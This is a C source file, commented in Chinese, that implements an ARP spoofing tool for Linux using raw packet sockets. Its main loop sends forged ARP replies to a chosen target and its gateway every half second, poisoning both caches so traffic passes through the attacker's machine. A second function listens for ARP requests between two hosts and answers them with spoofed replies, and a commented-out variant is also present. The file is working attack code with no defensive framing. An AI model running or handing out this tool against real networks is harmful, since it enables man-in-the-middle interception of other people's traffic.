#include <sys/ioctl.h>
#include <sys/socket.h>

#include <linux/if_ether.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <netinet/in.h>
#include <net/if.h>
#include <net/ethernet.h>
#include <netinet/if_ether.h>
#include <linux/if_packet.h>

#include <unistd.h>

#define IF_NAME "wlp3s0"

//以太网帧首部长度
#define ETHER_HEADER_LEN sizeof(struct ether_header)

//整个arp结构长度
#define ETHER_ARP_LEN sizeof(struct ether_arp)

//以太网帧长度
#define ETHER_PACKET_LEN (ETHER_HEADER_LEN + ETHER_ARP_LEN)

//IP地址长度
#define IP_ADDR_LEN 4

//MAC地址长度
#define MAC_ADDR_LEN 6

int passive_orientation_attack(unsigned char *targetIP1,
                               unsigned char *targetIP2);

int initiative_orientation_attack(unsigned char *target1IP,
                                  unsigned char *target1MAC,
                                  unsigned char *target2IP);


int main(int argc, char **argv) {
    unsigned char targetIP[IP_ADDR_LEN];
    unsigned char targetMAC[ETH_ALEN];

    unsigned char gatewayIP[IP_ADDR_LEN];
    unsigned char gatewayMAC[ETH_ALEN];

    for (int i = 1; i < argc; i++) {
        if (i % 2 == 1) {
            //IP
            char *arg = argv[i];
            unsigned char tmpIP[4];
            char tmpNumber[4];
            int tmpIndex = 0;
            int index = 0;
            printf("%s\n", arg);
            for (int j = 0;; j++) {
                if (arg[j] == '.' || arg[j] == '\0') {
                    tmpNumber[tmpIndex] = '\0';
                    tmpIP[index++] = (unsigned char) atoi(tmpNumber);
                    tmpIndex = 0;
                    if (index == 4) break;
                } else {
                    tmpNumber[tmpIndex++] = arg[j];

                }
            }
            if (i == 1) {
                memcpy(targetIP, tmpIP, 4);
                //target

            } else {
                //gateway
                memcpy(gatewayIP, tmpIP, 4);
            }
        } else {
            //MAC
            char *arg = argv[i];
            unsigned char tmpMAC[6];
            char tmpNumber[6];
            int tmpIndex = 0;
            int index = 0;
            printf("%s\n", arg);
            for (int j = 0;; j++) {
                if (arg[j] == ':' || arg[j] == '\0') {
                    tmpNumber[tmpIndex] = '\0';
                    tmpMAC[index++] = (unsigned char) strtol(tmpNumber, NULL, 16);
                    tmpIndex = 0;
                    if (index == 6) break;
                } else {
                    tmpNumber[tmpIndex++] = arg[j];
                }
            }
            if (i == 2) {
                memcpy(targetMAC, tmpMAC, 6);
                //target

            } else {
                //gateway
                memcpy(gatewayMAC, tmpMAC, 6);
            }
        }

    }

//    passive_orientation_attack(targetIP1, targetIP2);

    while (1) {
        initiative_orientation_attack(gatewayIP, gatewayMAC, targetIP);
        initiative_orientation_attack(targetIP, targetMAC, gatewayIP);
        usleep(500000);
    }

//    while (1) {
//
//        usleep(500000);
//    }

    return 0;
}

//被动定向攻击 似乎没有什么用。。。
int passive_orientation_attack(unsigned char *targetIP1,
                               unsigned char *targetIP2) {
    int s; //套接字
    unsigned char buff[ETHER_PACKET_LEN];//缓冲区,大小是整以个太网帧的大小

    //请求的ARP报文的首地址
    struct ether_arp *arp = (struct ether_arp *) (buff + ETHER_HEADER_LEN);

    //htons 是因为协议字段有2个字节,如下
    //#define ETH_P_ALL	0x0003
    //所以为了统一大端小端所以使用htons函数
    //真的有必要吗。。。
    if ((s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ARP))) == -1) {
        perror("监听用的socket错误");
        exit(1);
    }
    printf("开始监听\n");
    //持续监听
    while (1) {
        memset(buff, 0x00, ETHER_PACKET_LEN);//初始化数据包（全设置0）
        if (recv(s, buff, ETHER_PACKET_LEN, 0) > 0) {
            if (ntohs(arp->ea_hdr.ar_op) == 1) {
                //如果目标1到目标2或者目标2到目标1
                if ((memcmp(arp->arp_spa, targetIP1, IP_ADDR_LEN) == 0 &&
                     memcmp(arp->arp_tpa, targetIP2, IP_ADDR_LEN) == 0) ||
                    (memcmp(arp->arp_spa, targetIP2, IP_ADDR_LEN) == 0 &&
                     memcmp(arp->arp_tpa, targetIP1, IP_ADDR_LEN) == 0)) {

                    printf("发现目标(%d.%d.%d.%d)到目标(%d.%d.%d.%d)的ARP请求\n",
                           arp->arp_spa[0],
                           arp->arp_spa[1],
                           arp->arp_spa[2],
                           arp->arp_spa[3],

                           arp->arp_tpa[0],
                           arp->arp_tpa[1],
                           arp->arp_tpa[2],
                           arp->arp_tpa[3]
                    );
                    printf("发送者的MAC地址为(%X:%X:%X:%X:%X:%X)\n",
                           arp->arp_sha[0],
                           arp->arp_sha[1],
                           arp->arp_sha[2],
                           arp->arp_sha[3],
                           arp->arp_sha[4],
                           arp->arp_sha[5]
                    );
                    int ss;
                    if ((ss = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
                        perror("发送用的socket错误:");
                        exit(1);
                    }
                    unsigned char send_buff[ETHER_PACKET_LEN];//缓冲区,大小是整以个太网帧的大小

                    //复制一份请求报文，并拿来修改
                    memcpy(send_buff, buff, ETHER_PACKET_LEN);

                    //回应报文的首地址
                    struct ethhdr *send_ether = (struct ethhdr *) send_buff;
                    //回应报文的ARP部分的地址
                    struct ether_arp *send_arp = (struct ether_arp *) (send_buff + ETHER_HEADER_LEN);

                    //通过向内核发送命令获得对应网卡的MAC地址
                    int mac_s;
                    struct ifreq ifr;
                    char *iface = IF_NAME;
                    unsigned char *src_mac;
                    mac_s = socket(AF_INET, SOCK_DGRAM, 0);

                    ifr.ifr_addr.sa_family = AF_INET;
                    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
                    ioctl(mac_s, SIOCGIFHWADDR, &ifr);
                    close(mac_s);
                    src_mac = (unsigned char *) ifr.ifr_hwaddr.sa_data;

                    //填充以太帧首部
                    memcpy(send_ether->h_source, src_mac, ETH_ALEN);
                    memcpy(send_ether->h_dest, arp->arp_sha, ETH_ALEN);
                    send_ether->h_proto = htons(ETHERTYPE_ARP);

                    //填充ARP应答
                    send_arp->ea_hdr.ar_hrd = htons(1);
                    send_arp->ea_hdr.ar_pro = htons(0x0800);
                    send_arp->ea_hdr.ar_hln = 6;
                    send_arp->ea_hdr.ar_pln = 4;
                    send_arp->ea_hdr.ar_op = htons(2);
                    memcpy(send_arp->arp_sha, src_mac, ETH_ALEN);
                    memcpy(send_arp->arp_spa, arp->arp_tpa, 4);
                    memcpy(send_arp->arp_tha, arp->arp_sha, ETH_ALEN);
                    memcpy(send_arp->arp_tpa, arp->arp_spa, 4);

                    if (ioctl(ss, SIOCGIFINDEX, &ifr) == -1) {
                        perror("发送给内核命令错误");
                        exit(1);
                    }

                    //定义链路层数据结构体
                    struct sockaddr_ll ll;
                    memset(&ll, 0, sizeof(struct sockaddr_ll));
                    ll.sll_ifindex = ifr.ifr_ifindex;
                    ll.sll_family = PF_PACKET;

                    sendto(ss, send_arp, ETHER_PACKET_LEN, 0, (struct sockaddr *) &ll, sizeof(struct sockaddr_ll));
                    close(ss);
                }
            }
        }
    }


}

//成功执行
int initiative_orientation_attack(unsigned char *target1IP,
                                  unsigned char *target1MAC,
                                  unsigned char *target2IP) {
    int s;
    if ((s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
        perror("发送用的socket错误:");
        exit(1);
    }
    unsigned char send_buff[ETHER_PACKET_LEN];//缓冲区,大小是整以个太网帧的大小

    //重新构建报文
    memset(send_buff, 0, ETHER_PACKET_LEN);

    //回应报文的首地址
    struct ethhdr *send_ether = (struct ethhdr *) send_buff;
    //回应报文的ARP部分的地址
    struct ether_arp *send_arp = (struct ether_arp *) (send_buff + ETHER_HEADER_LEN);

    //通过向内核发送命令获得对应网卡的MAC地址
    int mac_s;
    struct ifreq ifr;
    char *iface = IF_NAME;
    unsigned char *myMac;
    mac_s = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
    ioctl(mac_s, SIOCGIFHWADDR, &ifr);
    close(mac_s);
    myMac = (unsigned char *) ifr.ifr_hwaddr.sa_data;

    //填充以太帧首部
    memcpy(send_ether->h_source, myMac, ETH_ALEN);
    memcpy(send_ether->h_dest, target1MAC, ETH_ALEN);
    send_ether->h_proto = htons(ETHERTYPE_ARP);

    //填充ARP应答
    send_arp->ea_hdr.ar_hrd = htons(1);
    send_arp->ea_hdr.ar_pro = htons(0x0800);
    send_arp->ea_hdr.ar_hln = 6;
    send_arp->ea_hdr.ar_pln = 4;
    send_arp->ea_hdr.ar_op = htons(2);
    memcpy(send_arp->arp_sha, myMac, ETH_ALEN);
    memcpy(send_arp->arp_spa, target2IP, 4);
    memcpy(send_arp->arp_tha, target1MAC, ETH_ALEN);
    memcpy(send_arp->arp_tpa, target1IP, 4);


    if (ioctl(s, SIOCGIFINDEX, &ifr) == -1) {
        perror("发送给内核命令错误");
        exit(1);
    }

    //定义链路层数据结构体
    struct sockaddr_ll ll;
    memset(&ll, 0, sizeof(struct sockaddr_ll));
    ll.sll_ifindex = ifr.ifr_ifindex;
    ll.sll_family = PF_PACKET;
    ll.sll_protocol = htons(ETH_P_ARP);
    ll.sll_halen = ETH_ALEN;
    ll.sll_hatype = htons(ARPHRD_ETHER);
    ll.sll_pkttype = (PACKET_BROADCAST);
    ll.sll_addr[6] = 0x00;
    ll.sll_addr[7] = 0x00;


    if (sendto(s, send_buff, ETHER_PACKET_LEN, 0, (struct sockaddr *) &ll, sizeof(struct sockaddr_ll)) == -1) {
        perror("发送ARP错误");
        exit(1);
    }
    close(s);
}

//int initiative_all_attack(unsigned char *gatewayIP) {
//    int s;
//    if ((s = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) == -1) {
//        perror("发送用的socket错误:");
//        exit(1);
//    }
//    unsigned char send_buff[ETHER_PACKET_LEN];//缓冲区,大小是整以个太网帧的大小
//
//    //重新构建报文
//    memset(send_buff, 0, ETHER_PACKET_LEN);
//
//    //回应报文的首地址
//    struct ethhdr *send_ether = (struct ethhdr *) send_buff;
//    //回应报文的ARP部分的地址
//    struct ether_arp *send_arp = (struct ether_arp *) (send_buff + ETHER_HEADER_LEN);
//
//    //通过向内核发送命令获得对应网卡的MAC地址
//    int mac_s;
//    struct ifreq ifr;
//    char *iface = IF_NAME;
//    unsigned char *myMac;
//    mac_s = socket(AF_INET, SOCK_DGRAM, 0);
//
//    ifr.ifr_addr.sa_family = AF_INET;
//    strncpy(ifr.ifr_name, iface, IFNAMSIZ - 1);
//    ioctl(mac_s, SIOCGIFHWADDR, &ifr);
//    close(mac_s);
//    myMac = (unsigned char *) ifr.ifr_hwaddr.sa_data;
//
//    //填充以太帧首部
//    memcpy(send_ether->h_source, myMac, ETH_ALEN);
//    memcpy(send_ether->h_dest, target1MAC, ETH_ALEN);
//    send_ether->h_proto = htons(ETHERTYPE_ARP);
//
//    //填充ARP应答
//    send_arp->ea_hdr.ar_hrd = htons(1);
//    send_arp->ea_hdr.ar_pro = htons(0x0800);
//    send_arp->ea_hdr.ar_hln = 6;
//    send_arp->ea_hdr.ar_pln = 4;
//    send_arp->ea_hdr.ar_op = htons(2);
//    memcpy(send_arp->arp_sha, myMac, ETH_ALEN);
//    memcpy(send_arp->arp_spa, target2IP, 4);
//    memcpy(send_arp->arp_tha, target1MAC, ETH_ALEN);
//    memcpy(send_arp->arp_tpa, target1IP, 4);
//
//
//    if (ioctl(s, SIOCGIFINDEX, &ifr) == -1) {
//        perror("发送给内核命令错误");
//        exit(1);
//    }
//
//    //定义链路层数据结构体
//    struct sockaddr_ll ll;
//    memset(&ll, 0, sizeof(struct sockaddr_ll));
//    ll.sll_ifindex = ifr.ifr_ifindex;
//    ll.sll_family = PF_PACKET;
//    ll.sll_protocol = htons(ETH_P_ARP);
//    ll.sll_halen = ETH_ALEN;
//    ll.sll_hatype = htons(ARPHRD_ETHER);
//    ll.sll_pkttype = (PACKET_BROADCAST);
//    ll.sll_addr[6] = 0x00;
//    ll.sll_addr[7] = 0x00;
//
//
//    if (sendto(s, send_buff, ETHER_PACKET_LEN, 0, (struct sockaddr *) &ll, sizeof(struct sockaddr_ll)) == -1) {
//        perror("发送ARP错误");
//        exit(1);
//    }
//    close(s);
//}